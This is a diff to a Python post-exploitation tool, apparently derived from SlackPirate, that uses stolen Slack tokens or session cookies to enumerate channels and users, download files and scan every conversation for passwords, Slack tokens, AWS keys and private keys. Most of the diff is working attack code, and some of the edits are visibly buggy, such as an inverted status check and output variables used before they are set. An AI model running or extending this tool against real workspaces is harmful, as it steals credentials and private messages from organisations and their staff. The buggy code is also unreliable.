@@ -6,17 +6,15 @@ import hashlib
 import re
 import uuid
 import urllib3
-import sys
-sys.path.append('./detect-secrets')  # Adjust the path as needed
-from detect_secrets.core.secrets_collection import SecretsCollection
-from detect_secrets.settings import transient_settings
-import json
+from termcolor import colored   
+import json 
 
 verbose = False
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# contants taken directly from slackpirate 
-# default these are not being used but still included if user decides not to use supplied library 
+unique_hashes = set()
+
+
 ALREADY_SIGNED_IN_TEAM_REGEX = r"([a-zA-Z0-9\-]+\.slack\.com)"
 SLACK_API_TOKEN_REGEX = r"(xox[a-zA-Z]-[a-zA-Z0-9-]+)"
 WORKSPACE_VALID_EMAILS_REGEX = r"email-domains-formatted=\"(@.+?)[\"]"
@@ -36,15 +34,15 @@ CREDENTIALS_REGEX = r"(?i)(" \
 
 AWS_KEYS_REGEX = r"(?!com/archives/[A-Z0-9]{9}/p[0-9]{16})" \
                  r"((?<![A-Za-z0-9/+])[A-Za-z0-9/+]{40}(?![A-Za-z0-9/+])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9]))"
-S3_QUERIES = ["s3.amazonaws.com", "s3://", "https://s3", "http://s3"]
-CREDENTIALS_QUERIES = ["password:", "password is", "pwd", "passwd"]
-AWS_KEYS_QUERIES = ["ASIA*", "AKIA*"]
-PRIVATE_KEYS_QUERIES = ["BEGIN DSA PRIVATE",
+S3_QUERIES = "|".join(["s3.amazonaws.com", "s3://", "https://s3", "http://s3"])
+CREDENTIALS_QUERIES = "|".join(["password:", "password is", "pwd", "passwd"])
+AWS_KEYS_QUERIES = "|".join(["ASIA*", "AKIA*"])
+PRIVATE_KEYS_QUERIES = "|".join(["BEGIN DSA PRIVATE",
                         "BEGIN EC PRIVATE",
                         "BEGIN OPENSSH PRIVATE",
                         "BEGIN PGP PRIVATE",
-                        "BEGIN RSA PRIVATE"]
-INTERESTING_FILE_QUERIES = [".config",
+                        "BEGIN RSA PRIVATE"])
+INTERESTING_FILE_QUERIES = "|".join([".config",
                             ".doc",
                             ".docx",
                             "id_rsa",
@@ -60,8 +58,8 @@ INTERESTING_FILE_QUERIES = [".config",
                             "password",
                             "id_rsa",
                             "pasted image",
-                            "secret"]
-LINKS_QUERIES = ["amazonaws",
+                            "secret"])
+LINKS_QUERIES = "|".join(["amazonaws",
                  "atlassian",
                  "beta",
                  "confluence",
@@ -75,7 +73,7 @@ LINKS_QUERIES = ["amazonaws",
                  "staging",
                  "swagger",
                  "travis",
-                 "trello"]
+                 "trello"])
 
 def make_cookie_request(workspace_url, user_cookie, proxy=None, verify_ssl=False):
     try:
@@ -146,9 +144,7 @@ def make_slack_request(url, credentials, method="POST", payload=None, proxy=None
         data = response.json()
         #print(f"Make Slack Request Response JSON: {data}")
 
-        if response.status_code == 200 and data.get("ok"):
-            print("Request passed!")
-        else:
+        if not response.status_code == 200 and data.get("ok"):
             print("Request failed.")
             print(f"Error message: {data.get('error', 'N/A')}")
 
@@ -458,17 +454,18 @@ def dump_logs(token, verbose=False):
         #    print("Response:", response.text)
 
 
-def unix_timestamp_to_human_readable(epoch_time):
+def unix_timestamp_to_human_readable(timestamp):
     try:
+        epoch_time = int(float(timestamp))  # Convert the timestamp to an integer
         timestamp_in_seconds = epoch_time / 1000  # converts to seconds
-        return datetime.utcfromtimestamp(timestamp_in_seconds).strftime('%Y-%m-%d %H:%M:%S UTC')
-    except ValueError:
+        human_readable_time = datetime.utcfromtimestamp(timestamp_in_seconds).strftime('%Y-%m-%d %H:%M:%S')
+        return human_readable_time
+    except (ValueError, TypeError) as e:
+        print(f"Error converting timestamp: {e}")
         return "N/A"
 
 def pillage_conversations(credentials, proxy, verify_ssl=False):
     all_conversations = list_channels(credentials, proxy=proxy, verify_ssl=verify_ssl)
-
-    secrets_collection = SecretsCollection()
 
     for conversation in all_conversations:
         conversation_id = conversation['id']
@@ -476,8 +473,13 @@ def pillage_conversations(credentials, proxy, verify_ssl=False):
         messages = retrieve_conversation_messages(credentials, conversation_id, proxy=proxy, verify_ssl=verify_ssl)
 
         for message in messages:
+            channel_name = conversation_name  # Assume channel name is the same as conversation name
+            channel_id = conversation_id
+            timestamp = message.get('ts', 'N/A')
+            sender_info = f"User ID: {message.get('user', 'N/A')}, Username: {message.get('username', 'N/A')}"
+
             text = message.get('text', '')
-            find_secrets_in_text(text, secrets_collection)
+            find_secrets_in_text(channel_name, channel_id, timestamp, sender_info, text) 
 
 
 def retrieve_conversation_messages(credentials, conversation_id, proxy, verify_ssl=False):
@@ -504,67 +506,82 @@ def retrieve_conversation_messages(credentials, conversation_id, proxy, verify_s
         return []
 
 
-def find_secrets_in_text(text, secrets_collection):
-    # Add the entire text as a potential secret with type 'Token'
-    secrets_collection.add_line("filename", text, "Token")
 
-    # Print the original text before scanning
-    print(f"Original text: {text}")
+def find_secrets_in_text(channel_name, channel_id, timestamp, sender_info, text):
+    # Hash the entire text to check for duplicates
+    text_hash = hashlib.md5(text.encode()).hexdigest()
 
-    # Run the scan operation on the provided text
-    secrets_collection.scan()
+    # Check if the hash is already encountered
+    if text_hash in unique_hashes:
+        # print("Duplicate found. Skipping...")
+        return
 
-    # Ensure that secrets_collection.json() returns a list of dictionaries
-    secrets = secrets_collection.json()
+    # Add the hash to the set for tracking
+    unique_hashes.add(text_hash)
 
-    if secrets:
-        print(f"Potential secrets found in message: {text}")
-        for secret in secrets:
-            if isinstance(secret, dict):
-                if 'type' in secret and 'filename' in secret and 'is_verified' in secret:
-                    print(f"Type: {secret['type']}, Filename: {secret['filename']}, Is Verified: {secret['is_verified']}")
-                elif 'Unexpected secret format: filename' not in str(secret):
-                    # Skip the output when encountering the specific message
-                    print(f"Unexpected secret format: {secret}")
-            else:
-                print(f"Unexpected secret format: {secret}")
+    # Use your provided regular expressions to find secrets in the text
+    matches_to_highlight = [
+        (re.compile(ALREADY_SIGNED_IN_TEAM_REGEX), 'cyan', 'ALREADY_SIGNED_IN_TEAM_REGEX'),
+        (re.compile(SLACK_API_TOKEN_REGEX), 'magenta', 'SLACK_API_TOKEN_REGEX'),
+        (re.compile(WORKSPACE_VALID_EMAILS_REGEX), 'yellow', 'WORKSPACE_VALID_EMAILS_REGEX'),
+        (re.compile(PRIVATE_KEYS_REGEX), 'red', 'PRIVATE_KEYS_REGEX'),
+        (re.compile(S3_REGEX), 'blue', 'S3_REGEX'),
+        (re.compile(CREDENTIALS_REGEX), 'red', 'CREDENTIALS_REGEX'),
+        (re.compile(AWS_KEYS_REGEX), 'red', 'AWS_KEYS_REGEX'),
+        (re.compile(S3_QUERIES), 'blue', 'S3_QUERIES'),
+        (re.compile(CREDENTIALS_QUERIES), 'red', 'CREDENTIALS_QUERIES'),
+        (re.compile(AWS_KEYS_QUERIES), 'red', 'AWS_KEYS_QUERIES'),
+        (re.compile(PRIVATE_KEYS_QUERIES), 'green', 'PRIVATE_KEYS_QUERIES'),
+        #(re.compile(INTERESTING_FILE_QUERIES), 'yellow', 'INTERESTING_FILE_QUERIES'),
+        #(re.compile(LINKS_QUERIES), 'cyan', 'LINKS_QUERIES'),
+    ]
 
+    details_printed = False
 
-"""
-# uses regex constants declared at beginning of script if you ever decide to not use detect-secrets lib
+    results = []
 
-def find_secrets_in_text(text):
-    already_signed_in_team_match = re.search(ALREADY_SIGNED_IN_TEAM_REGEX, text)
-    slack_api_token_match = re.search(SLACK_API_TOKEN_REGEX, text)
-    workspace_valid_emails_match = re.search(WORKSPACE_VALID_EMAILS_REGEX, text)
-    private_keys_match = re.search(PRIVATE_KEYS_REGEX, text)
-    s3_match = re.search(S3_REGEX, text)
-    credentials_match = re.search(CREDENTIALS_REGEX, text)
-    aws_keys_match = re.search(AWS_KEYS_REGEX, text)
+    for regex, _, rule_name in matches_to_highlight:
+        match = regex.search(text)
+        if match:
+            match_start = match.start(0)
+            match_end = match.end(0)
+            matched_word = text[match_start:match_end]
+            message_contents = f"{text[:match_start]}{matched_word}{text[match_end:]}"
+            rule_triggered = f"{rule_name}"
+            channel_name = f"{channel_name}"
+            channel_id = f"{channel_id}"
+            timestamp_info = f"{unix_timestamp_to_human_readable(timestamp)}"
+            sender_info = f"{sender_info}"
+            matched_word = f"{matched_word}"
 
-    if already_signed_in_team_match or slack_api_token_match or workspace_valid_emails_match or private_keys_match or s3_match or credentials_match or aws_keys_match:
-        print(f"Potential secret found in message: {text}")
-"""
+            results.append({
+                "rule_triggered": rule_triggered,
+                "channel_name": channel_name,
+                "channel_id": channel_id,
+                "timestamp": timestamp_info,
+                "sender_info": sender_info,
+                "matched_word": matched_word,
+                "message_contents": message_contents
+            })
 
+    if results:
+        print(json.dumps(results, indent=2))
 
-
-
-
+def save_output_to_json(data, filename):
+    with open(filename, 'w') as json_file:
+        json.dump(data, json_file, indent=2)
+    
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="Post-exploitation script for enumerating and pillaging slack",
-        usage="%(prog)s [--token TOKEN | --cookie COOKIE --workspace-url WORKSPACE_URL] --pillage",
-    )
-
-    auth_group = parser.add_argument_group("Authentication")
-    auth_group.add_argument("--token", type=str, help="Slack API (bot) token")
-    auth_group.add_argument("--cookie", type=str, help="User-supplied cookie (xoxb), automates xoxc conversion for you")
-    auth_group.add_argument("--user-cookie", type=str, help="User session cookie (e.g., xoxd-...)")
-    auth_group.add_argument("--workspace-url", type=str, help="Workspace URL for authenticating user session token")
-
+    parser = argparse.ArgumentParser(description="Download files from Slack channels")
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument("--pillage", action='store_true', help="Search conversations for secrets")
+    group.add_argument("--token", type=str, help="Slack API token")
+    group.add_argument("--cookie", type=str, help="User-supplied cookie")
+    group.add_argument("--user-cookie", type=str, help="User session cookie (e.g., xoxd-...)")
+    parser.add_argument("--workspace-url", type=str, help="Workspace URL for authenticating user session token")
+    
+    parser.add_argument("--pillage", action='store_true', help="Search conversations for secrets")
+    parser.add_argument("--output-json", "-o", type=str, help="Save output in JSON format to the specified file")
 
     parser.add_argument("--test", action='store_true', help="Test Slack credentials")
     parser.add_argument("--list-file-urls", action='store_true', help="Get file URLs")
@@ -580,14 +597,7 @@ def main():
 
     args = parser.parse_args()
 
-    # Check if --cookie is supplied, then --workspace-url is required
-    if args.cookie and not args.workspace_url:
-        parser.error("--workspace-url is required when --cookie is supplied.")
-
-
-
-    secrets_collection = SecretsCollection()
-
+    args = parser.parse_args()
 
     credentials = {}
     if args.token:
@@ -608,24 +618,26 @@ def main():
         channel_list = list_channels(credentials, proxy)
         user_membership = []
 
-        for channel in channel_list:
-            channel_id = channel['id']
-            is_member = check_user_membership(credentials, channel_id)
-            user_membership.append((channel_id, is_member))
+        output_data = {"Channels": []}
 
-        print("List of Channels:")
-        print()
         for channel in channel_list:
-            is_member = next((item[1] for item in user_membership if item[0] == channel['id']), False)
-            print(f"Name: {channel['name']}")
-            print(f"ID: {channel['id']}")
-            print(f"Value: {channel.get('value', 'N/A')}")
-            print(f"Created: {unix_timestamp_to_human_readable(channel.get('created', 0))}")
-            print(f"Last Updated: {unix_timestamp_to_human_readable(channel.get('updated', 0))}")
-            print(f"Context Team ID: {channel.get('context_team_id', 'N/A')}")
-            print(f"Creator: {channel.get('creator', 'N/A')}")
-            print(f"Is Supplied Token Member: {'Yes' if is_member else 'No'}")
-            print()
+            is_member = check_user_membership(credentials, channel['id'])
+            channel_info = {
+                "Name": channel['name'],
+                "ID": channel['id'],
+                "Value": channel.get('value', 'N/A'),
+                "Created": unix_timestamp_to_human_readable(channel.get('created', 0)),
+                "Last Updated": unix_timestamp_to_human_readable(channel.get('updated', 0)),
+                "Context Team ID": channel.get('context_team_id', 'N/A'),
+                "Creator": channel.get('creator', 'N/A'),
+                "Is Supplied Token Member": 'Yes' if is_member else 'No',
+            }
+            output_data["Channels"].append(channel_info)
+
+        if args.output_json:
+            save_output_to_json(output_data, args.output_json)
+        else:
+            print(json.dumps(output_data, indent=2))
 
     elif args.list_file_urls:
         channel_list = list_channels(credentials, proxy)
@@ -633,11 +645,21 @@ def main():
             channel_id = channel['id']
             list_file_urls(credentials, channel_id, proxy)
 
+        if args.output_json:
+            save_output_to_json(output_data, args.output_json)
+        else:
+            print(json.dumps(output_data, indent=2))
+
     elif args.list_files:
         all_file_urls = list_files(credentials, proxy)  # Pass the verbose flag
         print("List of All File URLs:")
         for file_url in all_file_urls:
             print(file_url)
+
+        if args.output_json:
+            save_output_to_json(output_data, args.output_json)
+        else:
+            print(json.dumps(output_data, indent=2))
 
     elif args.download_files:
         channel_list = list_channels(credentials, proxy=proxy)
@@ -651,29 +673,26 @@ def main():
 
     elif args.list_users:
         user_list = list_user_list(credentials, proxy=proxy)
-        print("List of users:")
-        print()
+
+        output_data = {"Users": []}  # Initialize 'Users' list here
 
         for user in user_list:
-            print(f"User ID: {user['id']}")
-            print(f"Username: {user['name']}")
-            #print(f"Real Name: {user['real_name']}")
-            print(f"Real Name: {user['profile'].get('real_name')}")
-            display_name = user['profile'].get('display_name_normalized', 'N/A')
-            print(f"Display Name: {display_name}")
-            email = user['profile'].get('email', 'N/A')
-            print(f"Email: {email}")
+            user_info = {
+                "User ID": user['id'],
+                "Username": user['name'],
+                "Real Name": user['profile'].get('real_name'),
+                "Display Name": user['profile'].get('display_name_normalized', 'N/A'),
+                "Email": user['profile'].get('email', 'N/A'),
+                "Is Admin": "Yes" if user.get('is_admin', False) else "No",
+                "Is Owner": "Yes" if user.get('is_owner', False) else "No",
+                "Is Primary Owner": "Yes" if user.get('is_primary_owner', False) else "No",
+            }
+            output_data["Users"].append(user_info)
 
-            is_admin = "Yes" if user.get('is_admin', False) else "No"
-            print(f"Is Admin: {is_admin}")
-
-            is_owner = "Yes" if user.get('is_owner', False) else "No"
-            print(f"Is Owner: {is_owner}")
-
-            is_primary_owner = "Yes" if user.get('is_primary_owner', False) else "No"
-            print(f"Is Primary Owner: {is_primary_owner}")
-
-            print()
+        if args.output_json:
+            save_output_to_json(output_data, args.output_json)
+        else:
+            print(json.dumps(output_data, indent=2))
 
     elif args.check_permissions:
         permissions = check_permissions(credentials)
@@ -686,12 +705,28 @@ def main():
         for flag in permissions['Available Flags']:
             print(flag)
 
+        if args.output_json:
+            save_output_to_json(output_data, args.output_json)
+        else:
+            print(json.dumps(output_data, indent=2))
+
     elif args.dump_logs:
         dump_logs(credentials, proxy)
 
-    if args.pillage:
-        pillage_conversations(credentials, proxy=proxy)
+        if args.output_json:
+            save_output_to_json(output_data, args.output_json)
+        else:
+            print(json.dumps(output_data, indent=2))
 
+    output_data = {}
+
+    if args.pillage:
+        output_data = pillage_conversations(credentials, proxy=proxy)
+
+        if args.output_json:
+            save_output_to_json(output_data, args.output_json)
+        else:
+            print(json.dumps(output_data, indent=2))
 
 if __name__ == "__main__":
     main() 
